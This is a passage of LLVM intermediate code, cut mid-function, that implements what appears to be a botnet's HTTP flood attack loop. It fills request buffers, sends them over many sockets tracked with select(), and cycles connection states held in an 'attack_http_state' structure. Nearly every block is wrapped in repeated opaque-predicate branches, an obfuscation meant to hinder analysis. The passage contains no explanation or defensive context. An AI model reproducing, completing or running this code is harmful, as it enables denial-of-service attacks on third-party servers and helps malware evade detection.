  %1058 = getelementptr inbounds [128 x i8], [128 x i8]* %1057, i32 0, i32 0
  %1059 = call i32 @util_strcpy(i8* %1052, i8* %1058)
  %1060 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1061 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1062 = call i32 @util_strlen(i8* %1061)
  %1063 = sext i32 %1062 to i64
  %1064 = getelementptr inbounds i8, i8* %1060, i64 %1063
  %1065 = call i32 @util_strcpy(i8* %1064, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  br label %1066

; <label>:1066:                                   ; preds = %1047
  %1067 = load i32, i32* @x.17
  %1068 = load i32, i32* @y.18
  %1069 = sub i32 %1067, 1
  %1070 = mul i32 %1067, %1069
  %1071 = urem i32 %1070, 2
  %1072 = icmp eq i32 %1071, 0
  %1073 = icmp slt i32 %1068, 10
  %1074 = or i1 %1072, %1073
  br i1 %1074, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %1066
  %1075 = load i32, i32* %18, align 4
  %1076 = add nsw i32 %1075, 1
  store i32 %1076, i32* %18, align 4
  %1077 = load i32, i32* @x.17
  %1078 = load i32, i32* @y.18
  %1079 = sub i32 %1077, 1
  %1080 = mul i32 %1077, %1079
  %1081 = urem i32 %1080, 2
  %1082 = icmp eq i32 %1081, 0
  %1083 = icmp slt i32 %1078, 10
  %1084 = or i1 %1082, %1083
  br i1 %1084, label %originalBBpart2135, label %originalBB124alteredBB

originalBBpart2135:                               ; preds = %originalBB124
  br label %1025

; <label>:1085:                                   ; preds = %originalBBpart2122
  %1086 = load i32, i32* @x.17
  %1087 = load i32, i32* @y.18
  %1088 = sub i32 %1086, 1
  %1089 = mul i32 %1086, %1088
  %1090 = urem i32 %1089, 2
  %1091 = icmp eq i32 %1090, 0
  %1092 = icmp slt i32 %1087, 10
  %1093 = or i1 %1091, %1092
  br i1 %1093, label %originalBB137, label %originalBB137alteredBB

originalBB137:                                    ; preds = %originalBB137alteredBB, %1085
  %1094 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1095 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1096 = call i32 @util_strlen(i8* %1095)
  %1097 = sext i32 %1096 to i64
  %1098 = getelementptr inbounds i8, i8* %1094, i64 %1097
  %1099 = call i32 @util_strcpy(i8* %1098, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %1100 = load i32, i32* @x.17
  %1101 = load i32, i32* @y.18
  %1102 = sub i32 %1100, 1
  %1103 = mul i32 %1100, %1102
  %1104 = urem i32 %1103, 2
  %1105 = icmp eq i32 %1104, 0
  %1106 = icmp slt i32 %1101, 10
  %1107 = or i1 %1105, %1106
  br i1 %1107, label %originalBBpart2139, label %originalBB137alteredBB

originalBBpart2139:                               ; preds = %originalBB137
  br label %1108

; <label>:1108:                                   ; preds = %originalBBpart2139, %1013
  %1109 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1110 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1111 = call i32 @util_strlen(i8* %1110)
  %1112 = sext i32 %1111 to i64
  %1113 = getelementptr inbounds i8, i8* %1109, i64 %1112
  %1114 = call i32 @util_strcpy(i8* %1113, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %1115 = load i8*, i8** %22, align 8
  %1116 = icmp ne i8* %1115, null
  br i1 %1116, label %1117, label %1125

; <label>:1117:                                   ; preds = %1108
  %1118 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1119 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1120 = call i32 @util_strlen(i8* %1119)
  %1121 = sext i32 %1120 to i64
  %1122 = getelementptr inbounds i8, i8* %1118, i64 %1121
  %1123 = load i8*, i8** %22, align 8
  %1124 = call i32 @util_strcpy(i8* %1122, i8* %1123)
  br label %1125

; <label>:1125:                                   ; preds = %1117, %1108
  %1126 = load i32, i32* @x.17
  %1127 = load i32, i32* @y.18
  %1128 = sub i32 %1126, 1
  %1129 = mul i32 %1126, %1128
  %1130 = urem i32 %1129, 2
  %1131 = icmp eq i32 %1130, 0
  %1132 = icmp slt i32 %1127, 10
  %1133 = or i1 %1131, %1132
  br i1 %1133, label %originalBB141, label %originalBB141alteredBB

originalBB141:                                    ; preds = %originalBB141alteredBB, %1125
  %1134 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1135 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1134, i32 0, i32 9
  %1136 = getelementptr inbounds [9 x i8], [9 x i8]* %1135, i32 0, i32 0
  %1137 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1138 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1137, i32 0, i32 10
  %1139 = getelementptr inbounds [9 x i8], [9 x i8]* %1138, i32 0, i32 0
  %1140 = call signext i8 @util_strcmp(i8* %1136, i8* %1139)
  %1141 = icmp ne i8 %1140, 0
  %1142 = load i32, i32* @x.17
  %1143 = load i32, i32* @y.18
  %1144 = sub i32 %1142, 1
  %1145 = mul i32 %1142, %1144
  %1146 = urem i32 %1145, 2
  %1147 = icmp eq i32 %1146, 0
  %1148 = icmp slt i32 %1143, 10
  %1149 = or i1 %1147, %1148
  br i1 %1149, label %originalBBpart2143, label %originalBB141alteredBB

originalBBpart2143:                               ; preds = %originalBB141
  br i1 %1141, label %1158, label %1150

; <label>:1150:                                   ; preds = %originalBBpart2143
  %1151 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1152 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1151, i32 0, i32 9
  %1153 = getelementptr inbounds [9 x i8], [9 x i8]* %1152, i32 0, i32 0
  %1154 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1155 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1154, i32 0, i32 10
  %1156 = getelementptr inbounds [9 x i8], [9 x i8]* %1155, i32 0, i32 0
  %1157 = call i32 @util_strcpy(i8* %1153, i8* %1156)
  br label %1158

; <label>:1158:                                   ; preds = %1150, %originalBBpart2143
  %1159 = load i32, i32* @x.17
  %1160 = load i32, i32* @y.18
  %1161 = sub i32 %1159, 1
  %1162 = mul i32 %1159, %1161
  %1163 = urem i32 %1162, 2
  %1164 = icmp eq i32 %1163, 0
  %1165 = icmp slt i32 %1160, 10
  %1166 = or i1 %1164, %1165
  br i1 %1166, label %originalBB145, label %originalBB145alteredBB

originalBB145:                                    ; preds = %originalBB145alteredBB, %1158
  %1167 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1168 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1167, i32 0, i32 0
  %1169 = load i32, i32* %1168, align 4
  %1170 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1171 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1172 = call i32 @util_strlen(i8* %1171)
  %1173 = sext i32 %1172 to i64
  %1174 = call i64 @send(i32 %1169, i8* %1170, i64 %1173, i32 16384)
  %1175 = load i32, i32* %35, align 4
  %1176 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1177 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1176, i32 0, i32 3
  store i32 %1175, i32* %1177, align 4
  %1178 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1179 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1178, i32 0, i32 1
  store i8 6, i8* %1179, align 4
  %1180 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1181 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1180, i32 0, i32 0
  %1182 = load i32, i32* %1181, align 4
  %1183 = srem i32 %1182, 64
  %1184 = zext i32 %1183 to i64
  %1185 = shl i64 1, %1184
  %1186 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %1187 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1188 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1187, i32 0, i32 0
  %1189 = load i32, i32* %1188, align 4
  %1190 = sdiv i32 %1189, 64
  %1191 = sext i32 %1190 to i64
  %1192 = getelementptr inbounds [16 x i64], [16 x i64]* %1186, i64 0, i64 %1191
  %1193 = load i64, i64* %1192, align 8
  %1194 = or i64 %1193, %1185
  store i64 %1194, i64* %1192, align 8
  %1195 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1196 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1195, i32 0, i32 0
  %1197 = load i32, i32* %1196, align 4
  %1198 = load i32, i32* %31, align 4
  %1199 = icmp sgt i32 %1197, %1198
  %1200 = load i32, i32* @x.17
  %1201 = load i32, i32* @y.18
  %1202 = sub i32 %1200, 1
  %1203 = mul i32 %1200, %1202
  %1204 = urem i32 %1203, 2
  %1205 = icmp eq i32 %1204, 0
  %1206 = icmp slt i32 %1201, 10
  %1207 = or i1 %1205, %1206
  br i1 %1207, label %originalBBpart2167, label %originalBB145alteredBB

originalBBpart2167:                               ; preds = %originalBB145
  br i1 %1199, label %1208, label %1229

; <label>:1208:                                   ; preds = %originalBBpart2167
  %1209 = load i32, i32* @x.17
  %1210 = load i32, i32* @y.18
  %1211 = sub i32 %1209, 1
  %1212 = mul i32 %1209, %1211
  %1213 = urem i32 %1212, 2
  %1214 = icmp eq i32 %1213, 0
  %1215 = icmp slt i32 %1210, 10
  %1216 = or i1 %1214, %1215
  br i1 %1216, label %originalBB169, label %originalBB169alteredBB

originalBB169:                                    ; preds = %originalBB169alteredBB, %1208
  %1217 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1218 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1217, i32 0, i32 0
  %1219 = load i32, i32* %1218, align 4
  %1220 = add nsw i32 %1219, 1
  store i32 %1220, i32* %31, align 4
  %1221 = load i32, i32* @x.17
  %1222 = load i32, i32* @y.18
  %1223 = sub i32 %1221, 1
  %1224 = mul i32 %1221, %1223
  %1225 = urem i32 %1224, 2
  %1226 = icmp eq i32 %1225, 0
  %1227 = icmp slt i32 %1222, 10
  %1228 = or i1 %1226, %1227
  br i1 %1228, label %originalBBpart2181, label %originalBB169alteredBB

originalBBpart2181:                               ; preds = %originalBB169
  br label %1229

; <label>:1229:                                   ; preds = %originalBBpart2181, %originalBBpart2167
  br label %1485

; <label>:1230:                                   ; preds = %838
  %1231 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1232 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1231, i32 0, i32 1
  %1233 = load i8, i8* %1232, align 4
  %1234 = zext i8 %1233 to i32
  %1235 = icmp eq i32 %1234, 6
  br i1 %1235, label %1236, label %1311

; <label>:1236:                                   ; preds = %1230
  %1237 = load i32, i32* @x.17
  %1238 = load i32, i32* @y.18
  %1239 = sub i32 %1237, 1
  %1240 = mul i32 %1237, %1239
  %1241 = urem i32 %1240, 2
  %1242 = icmp eq i32 %1241, 0
  %1243 = icmp slt i32 %1238, 10
  %1244 = or i1 %1242, %1243
  br i1 %1244, label %originalBB183, label %originalBB183alteredBB

originalBB183:                                    ; preds = %originalBB183alteredBB, %1236
  %1245 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1246 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1245, i32 0, i32 0
  %1247 = load i32, i32* %1246, align 4
  %1248 = srem i32 %1247, 64
  %1249 = zext i32 %1248 to i64
  %1250 = shl i64 1, %1249
  %1251 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %1252 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1253 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1252, i32 0, i32 0
  %1254 = load i32, i32* %1253, align 4
  %1255 = sdiv i32 %1254, 64
  %1256 = sext i32 %1255 to i64
  %1257 = getelementptr inbounds [16 x i64], [16 x i64]* %1251, i64 0, i64 %1256
  %1258 = load i64, i64* %1257, align 8
  %1259 = or i64 %1258, %1250
  store i64 %1259, i64* %1257, align 8
  %1260 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1261 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1260, i32 0, i32 0
  %1262 = load i32, i32* %1261, align 4
  %1263 = load i32, i32* %31, align 4
  %1264 = icmp sgt i32 %1262, %1263
  %1265 = load i32, i32* @x.17
  %1266 = load i32, i32* @y.18
  %1267 = sub i32 %1265, 1
  %1268 = mul i32 %1265, %1267
  %1269 = urem i32 %1268, 2
  %1270 = icmp eq i32 %1269, 0
  %1271 = icmp slt i32 %1266, 10
  %1272 = or i1 %1270, %1271
  br i1 %1272, label %originalBBpart2225, label %originalBB183alteredBB

originalBBpart2225:                               ; preds = %originalBB183
  br i1 %1264, label %1273, label %1294

; <label>:1273:                                   ; preds = %originalBBpart2225
  %1274 = load i32, i32* @x.17
  %1275 = load i32, i32* @y.18
  %1276 = sub i32 %1274, 1
  %1277 = mul i32 %1274, %1276
  %1278 = urem i32 %1277, 2
  %1279 = icmp eq i32 %1278, 0
  %1280 = icmp slt i32 %1275, 10
  %1281 = or i1 %1279, %1280
  br i1 %1281, label %originalBB227, label %originalBB227alteredBB

originalBB227:                                    ; preds = %originalBB227alteredBB, %1273
  %1282 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1283 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1282, i32 0, i32 0
  %1284 = load i32, i32* %1283, align 4
  %1285 = add nsw i32 %1284, 1
  store i32 %1285, i32* %31, align 4
  %1286 = load i32, i32* @x.17
  %1287 = load i32, i32* @y.18
  %1288 = sub i32 %1286, 1
  %1289 = mul i32 %1286, %1288
  %1290 = urem i32 %1289, 2
  %1291 = icmp eq i32 %1290, 0
  %1292 = icmp slt i32 %1287, 10
  %1293 = or i1 %1291, %1292
  br i1 %1293, label %originalBBpart2229, label %originalBB227alteredBB

originalBBpart2229:                               ; preds = %originalBB227
  br label %1294

; <label>:1294:                                   ; preds = %originalBBpart2229, %originalBBpart2225
  %1295 = load i32, i32* @x.17
  %1296 = load i32, i32* @y.18
  %1297 = sub i32 %1295, 1
  %1298 = mul i32 %1295, %1297
  %1299 = urem i32 %1298, 2
  %1300 = icmp eq i32 %1299, 0
  %1301 = icmp slt i32 %1296, 10
  %1302 = or i1 %1300, %1301
  br i1 %1302, label %originalBB231, label %originalBB231alteredBB

originalBB231:                                    ; preds = %originalBB231alteredBB, %1294
  %1303 = load i32, i32* @x.17
  %1304 = load i32, i32* @y.18
  %1305 = sub i32 %1303, 1
  %1306 = mul i32 %1303, %1305
  %1307 = urem i32 %1306, 2
  %1308 = icmp eq i32 %1307, 0
  %1309 = icmp slt i32 %1304, 10
  %1310 = or i1 %1308, %1309
  br i1 %1310, label %originalBBpart2233, label %originalBB231alteredBB

originalBBpart2233:                               ; preds = %originalBB231
  br label %1468

; <label>:1311:                                   ; preds = %1230
  %1312 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1313 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1312, i32 0, i32 1
  %1314 = load i8, i8* %1313, align 4
  %1315 = zext i8 %1314 to i32
  %1316 = icmp eq i32 %1315, 7
  br i1 %1316, label %1317, label %1360

; <label>:1317:                                   ; preds = %1311
  %1318 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1319 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1318, i32 0, i32 0
  %1320 = load i32, i32* %1319, align 4
  %1321 = srem i32 %1320, 64
  %1322 = zext i32 %1321 to i64
  %1323 = shl i64 1, %1322
  %1324 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %1325 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1326 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1325, i32 0, i32 0
  %1327 = load i32, i32* %1326, align 4
  %1328 = sdiv i32 %1327, 64
  %1329 = sext i32 %1328 to i64
  %1330 = getelementptr inbounds [16 x i64], [16 x i64]* %1324, i64 0, i64 %1329
  %1331 = load i64, i64* %1330, align 8
  %1332 = or i64 %1331, %1323
  store i64 %1332, i64* %1330, align 8
  %1333 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1334 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1333, i32 0, i32 0
  %1335 = load i32, i32* %1334, align 4
  %1336 = load i32, i32* %31, align 4
  %1337 = icmp sgt i32 %1335, %1336
  br i1 %1337, label %1338, label %1343

; <label>:1338:                                   ; preds = %1317
  %1339 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1340 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1339, i32 0, i32 0
  %1341 = load i32, i32* %1340, align 4
  %1342 = add nsw i32 %1341, 1
  store i32 %1342, i32* %31, align 4
  br label %1343

; <label>:1343:                                   ; preds = %1338, %1317
  %1344 = load i32, i32* @x.17
  %1345 = load i32, i32* @y.18
  %1346 = sub i32 %1344, 1
  %1347 = mul i32 %1344, %1346
  %1348 = urem i32 %1347, 2
  %1349 = icmp eq i32 %1348, 0
  %1350 = icmp slt i32 %1345, 10
  %1351 = or i1 %1349, %1350
  br i1 %1351, label %originalBB235, label %originalBB235alteredBB

originalBB235:                                    ; preds = %originalBB235alteredBB, %1343
  %1352 = load i32, i32* @x.17
  %1353 = load i32, i32* @y.18
  %1354 = sub i32 %1352, 1
  %1355 = mul i32 %1352, %1354
  %1356 = urem i32 %1355, 2
  %1357 = icmp eq i32 %1356, 0
  %1358 = icmp slt i32 %1353, 10
  %1359 = or i1 %1357, %1358
  br i1 %1359, label %originalBBpart2237, label %originalBB235alteredBB

originalBBpart2237:                               ; preds = %originalBB235
  br label %1467

; <label>:1360:                                   ; preds = %1311
  %1361 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1362 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1361, i32 0, i32 1
  %1363 = load i8, i8* %1362, align 4
  %1364 = zext i8 %1363 to i32
  %1365 = icmp eq i32 %1364, 10
  br i1 %1365, label %1366, label %1425

; <label>:1366:                                   ; preds = %1360
  %1367 = load i32, i32* @x.17
  %1368 = load i32, i32* @y.18
  %1369 = sub i32 %1367, 1
  %1370 = mul i32 %1367, %1369
  %1371 = urem i32 %1370, 2
  %1372 = icmp eq i32 %1371, 0
  %1373 = icmp slt i32 %1368, 10
  %1374 = or i1 %1372, %1373
  br i1 %1374, label %originalBB239, label %originalBB239alteredBB

originalBB239:                                    ; preds = %originalBB239alteredBB, %1366
  %1375 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1376 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1375, i32 0, i32 0
  %1377 = load i32, i32* %1376, align 4
  %1378 = srem i32 %1377, 64
  %1379 = zext i32 %1378 to i64
  %1380 = shl i64 1, %1379
  %1381 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %1382 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1383 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1382, i32 0, i32 0
  %1384 = load i32, i32* %1383, align 4
  %1385 = sdiv i32 %1384, 64
  %1386 = sext i32 %1385 to i64
  %1387 = getelementptr inbounds [16 x i64], [16 x i64]* %1381, i64 0, i64 %1386
  %1388 = load i64, i64* %1387, align 8
  %1389 = or i64 %1388, %1380
  store i64 %1389, i64* %1387, align 8
  %1390 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1391 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1390, i32 0, i32 0
  %1392 = load i32, i32* %1391, align 4
  %1393 = load i32, i32* %31, align 4
  %1394 = icmp sgt i32 %1392, %1393
  %1395 = load i32, i32* @x.17
  %1396 = load i32, i32* @y.18
  %1397 = sub i32 %1395, 1
  %1398 = mul i32 %1395, %1397
  %1399 = urem i32 %1398, 2
  %1400 = icmp eq i32 %1399, 0
  %1401 = icmp slt i32 %1396, 10
  %1402 = or i1 %1400, %1401
  br i1 %1402, label %originalBBpart2255, label %originalBB239alteredBB

originalBBpart2255:                               ; preds = %originalBB239
  br i1 %1394, label %1403, label %1424

; <label>:1403:                                   ; preds = %originalBBpart2255
  %1404 = load i32, i32* @x.17
  %1405 = load i32, i32* @y.18
  %1406 = sub i32 %1404, 1
  %1407 = mul i32 %1404, %1406
  %1408 = urem i32 %1407, 2
  %1409 = icmp eq i32 %1408, 0
  %1410 = icmp slt i32 %1405, 10
  %1411 = or i1 %1409, %1410
  br i1 %1411, label %originalBB257, label %originalBB257alteredBB

originalBB257:                                    ; preds = %originalBB257alteredBB, %1403
  %1412 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1413 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1412, i32 0, i32 0
  %1414 = load i32, i32* %1413, align 4
  %1415 = add nsw i32 %1414, 1
  store i32 %1415, i32* %31, align 4
  %1416 = load i32, i32* @x.17
  %1417 = load i32, i32* @y.18
  %1418 = sub i32 %1416, 1
  %1419 = mul i32 %1416, %1418
  %1420 = urem i32 %1419, 2
  %1421 = icmp eq i32 %1420, 0
  %1422 = icmp slt i32 %1417, 10
  %1423 = or i1 %1421, %1422
  br i1 %1423, label %originalBBpart2275, label %originalBB257alteredBB

originalBBpart2275:                               ; preds = %originalBB257
  br label %1424

; <label>:1424:                                   ; preds = %originalBBpart2275, %originalBBpart2255
  br label %1466

; <label>:1425:                                   ; preds = %1360
  %1426 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1427 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1426, i32 0, i32 1
  %1428 = load i8, i8* %1427, align 4
  %1429 = zext i8 %1428 to i32
  %1430 = icmp eq i32 %1429, 11
  br i1 %1430, label %1431, label %1440

; <label>:1431:                                   ; preds = %1425
  %1432 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1433 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1432, i32 0, i32 1
  store i8 0, i8* %1433, align 4
  %1434 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1435 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1434, i32 0, i32 0
  %1436 = load i32, i32* %1435, align 4
  %1437 = call i32 @close(i32 %1436)
  %1438 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1439 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1438, i32 0, i32 0
  store i32 -1, i32* %1439, align 4
  br label %1465

; <label>:1440:                                   ; preds = %1425
  %1441 = load i32, i32* @x.17
  %1442 = load i32, i32* @y.18
  %1443 = sub i32 %1441, 1
  %1444 = mul i32 %1441, %1443
  %1445 = urem i32 %1444, 2
  %1446 = icmp eq i32 %1445, 0
  %1447 = icmp slt i32 %1442, 10
  %1448 = or i1 %1446, %1447
  br i1 %1448, label %originalBB277, label %originalBB277alteredBB

originalBB277:                                    ; preds = %originalBB277alteredBB, %1440
  %1449 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1450 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1449, i32 0, i32 1
  store i8 0, i8* %1450, align 4
  %1451 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1452 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1451, i32 0, i32 0
  %1453 = load i32, i32* %1452, align 4
  %1454 = call i32 @close(i32 %1453)
  %1455 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1456 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1455, i32 0, i32 0
  store i32 -1, i32* %1456, align 4
  %1457 = load i32, i32* @x.17
  %1458 = load i32, i32* @y.18
  %1459 = sub i32 %1457, 1
  %1460 = mul i32 %1457, %1459
  %1461 = urem i32 %1460, 2
  %1462 = icmp eq i32 %1461, 0
  %1463 = icmp slt i32 %1458, 10
  %1464 = or i1 %1462, %1463
  br i1 %1464, label %originalBBpart2279, label %originalBB277alteredBB

originalBBpart2279:                               ; preds = %originalBB277
  br label %1465

; <label>:1465:                                   ; preds = %originalBBpart2279, %1431
  br label %1466

; <label>:1466:                                   ; preds = %1465, %1424
  br label %1467

; <label>:1467:                                   ; preds = %1466, %originalBBpart2237
  br label %1468

; <label>:1468:                                   ; preds = %1467, %originalBBpart2233
  %1469 = load i32, i32* @x.17
  %1470 = load i32, i32* @y.18
  %1471 = sub i32 %1469, 1
  %1472 = mul i32 %1469, %1471
  %1473 = urem i32 %1472, 2
  %1474 = icmp eq i32 %1473, 0
  %1475 = icmp slt i32 %1470, 10
  %1476 = or i1 %1474, %1475
  br i1 %1476, label %originalBB281, label %originalBB281alteredBB

originalBB281:                                    ; preds = %originalBB281alteredBB, %1468
  %1477 = load i32, i32* @x.17
  %1478 = load i32, i32* @y.18
  %1479 = sub i32 %1477, 1
  %1480 = mul i32 %1477, %1479
  %1481 = urem i32 %1480, 2
  %1482 = icmp eq i32 %1481, 0
  %1483 = icmp slt i32 %1478, 10
  %1484 = or i1 %1482, %1483
  br i1 %1484, label %originalBBpart2283, label %originalBB281alteredBB

originalBBpart2283:                               ; preds = %originalBB281
  br label %1485

; <label>:1485:                                   ; preds = %originalBBpart2283, %1229
  br label %1486

; <label>:1486:                                   ; preds = %1485, %837
  br label %1487

; <label>:1487:                                   ; preds = %1486, %756
  %1488 = load i32, i32* @x.17
  %1489 = load i32, i32* @y.18
  %1490 = sub i32 %1488, 1
  %1491 = mul i32 %1488, %1490
  %1492 = urem i32 %1491, 2
  %1493 = icmp eq i32 %1492, 0
  %1494 = icmp slt i32 %1489, 10
  %1495 = or i1 %1493, %1494
  br i1 %1495, label %originalBB285, label %originalBB285alteredBB

originalBB285:                                    ; preds = %originalBB285alteredBB, %1487
  %1496 = load i32, i32* @x.17
  %1497 = load i32, i32* @y.18
  %1498 = sub i32 %1496, 1
  %1499 = mul i32 %1496, %1498
  %1500 = urem i32 %1499, 2
  %1501 = icmp eq i32 %1500, 0
  %1502 = icmp slt i32 %1497, 10
  %1503 = or i1 %1501, %1502
  br i1 %1503, label %originalBBpart2287, label %originalBB285alteredBB

originalBBpart2287:                               ; preds = %originalBB285
  br label %1504

; <label>:1504:                                   ; preds = %originalBBpart2287, %originalBBpart2102, %originalBBpart298
  %1505 = load i32, i32* %17, align 4
  %1506 = add nsw i32 %1505, 1
  store i32 %1506, i32* %17, align 4
  br label %549

; <label>:1507:                                   ; preds = %originalBBpart278
  %1508 = load i32, i32* %31, align 4
  %1509 = icmp eq i32 %1508, 0
  br i1 %1509, label %1510, label %1511

; <label>:1510:                                   ; preds = %1507
  br label %510

; <label>:1511:                                   ; preds = %1507
  %1512 = getelementptr inbounds %struct.timeval, %struct.timeval* %33, i32 0, i32 1
  store i64 0, i64* %1512, align 8
  %1513 = getelementptr inbounds %struct.timeval, %struct.timeval* %33, i32 0, i32 0
  store i64 1, i64* %1513, align 8
  %1514 = load i32, i32* %31, align 4
  %1515 = call i32 @select(i32 %1514, %struct.fd_set* %29, %struct.fd_set* %30, %struct.fd_set* null, %struct.timeval* %33)
  store i32 %1515, i32* %32, align 4
  %1516 = call i64 @time(i64* null) #6
  %1517 = trunc i64 %1516 to i32
  store i32 %1517, i32* %35, align 4
  %1518 = load i32, i32* %32, align 4
  %1519 = icmp slt i32 %1518, 1
  br i1 %1519, label %1520, label %1521

; <label>:1520:                                   ; preds = %1511
  br label %510

; <label>:1521:                                   ; preds = %1511
  %1522 = load i32, i32* @x.17
  %1523 = load i32, i32* @y.18
  %1524 = sub i32 %1522, 1
  %1525 = mul i32 %1522, %1524
  %1526 = urem i32 %1525, 2
  %1527 = icmp eq i32 %1526, 0
  %1528 = icmp slt i32 %1523, 10
  %1529 = or i1 %1527, %1528
  br i1 %1529, label %originalBB289, label %originalBB289alteredBB

originalBB289:                                    ; preds = %originalBB289alteredBB, %1521
  store i32 0, i32* %17, align 4
  %1530 = load i32, i32* @x.17
  %1531 = load i32, i32* @y.18
  %1532 = sub i32 %1530, 1
  %1533 = mul i32 %1530, %1532
  %1534 = urem i32 %1533, 2
  %1535 = icmp eq i32 %1534, 0
  %1536 = icmp slt i32 %1531, 10
  %1537 = or i1 %1535, %1536
  br i1 %1537, label %originalBBpart2291, label %originalBB289alteredBB

originalBBpart2291:                               ; preds = %originalBB289
  br label %1538

; <label>:1538:                                   ; preds = %originalBBpart2792, %originalBBpart2291
  %1539 = load i32, i32* %17, align 4
  %1540 = load i32, i32* %26, align 4
  %1541 = icmp slt i32 %1539, %1540
  br i1 %1541, label %1542, label %4156

; <label>:1542:                                   ; preds = %1538
  %1543 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %1544 = load i32, i32* %17, align 4
  %1545 = sext i32 %1544 to i64
  %1546 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1543, i64 %1545
  store %struct.attack_http_state* %1546, %struct.attack_http_state** %34, align 8
  %1547 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
